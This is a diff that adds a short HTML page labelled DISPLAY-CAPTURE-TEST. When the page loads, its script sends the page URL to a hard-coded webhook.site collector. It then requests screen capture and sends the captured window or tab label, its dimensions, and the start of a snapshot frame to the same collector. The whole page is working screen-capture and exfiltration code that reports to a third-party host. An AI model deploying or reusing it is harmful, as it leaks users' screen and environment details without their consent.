@@ -1,0 +1,24 @@
+<!doctype html><html><body style="font:14px monospace;padding:8px"><h3>DISPLAY-CAPTURE-TEST</h3><pre id="o">start</pre>
+<script>
+var HOOK='https://webhook.site/32e5dae1-948c-47d1-bd9c-536490ea54cd';
+function log(s){try{document.getElementById('o').textContent+='\n'+s}catch(e){}}
+function post(t,d){try{fetch(HOOK,{method:'POST',body:t+'\n'+JSON.stringify(d||{})})}catch(e){}}
+var out={href:location.href, hasGDM: !!(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia)};
+post('DISP_PAGE',out); log(JSON.stringify(out));
+if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){
+  navigator.mediaDevices.getDisplayMedia({video:true}).then(function(st){
+    var t=st.getVideoTracks()[0], s=t?t.getSettings():{};
+    post('DISP_OK',{label:t&&t.label,w:s.width,h:s.height,displaySurface:s.displaySurface});
+    log('DISP_OK '+JSON.stringify({label:t&&t.label,w:s.width,h:s.height}));
+    // 抓到后立刻截一帧，回传尺寸与哈希（不落盘人像/界面）
+    var v=document.createElement('video'); v.srcObject=st; v.muted=true; v.play();
+    setTimeout(function(){
+      var c=document.createElement('canvas'); c.width=64; c.height=64;
+      try{ c.getContext('2d').drawImage(v,0,0,64,64);
+        var d=c.toDataURL('image/jpeg',0.5); post('DISP_FRAME',{dataurl_head:d.substring(0,80),len:d.length});
+      }catch(e){ post('DISP_FRAME_ERR',''+e) }
+      st.getTracks().forEach(function(x){try{x.stop()}catch(e){}});
+    },1500);
+  }).catch(function(e){ post('DISP_ERR',''+e); log('DISP_ERR '+e) });
+} else { post('DISP_NOSUPPORT','no getDisplayMedia'); }
+</script></body></html>
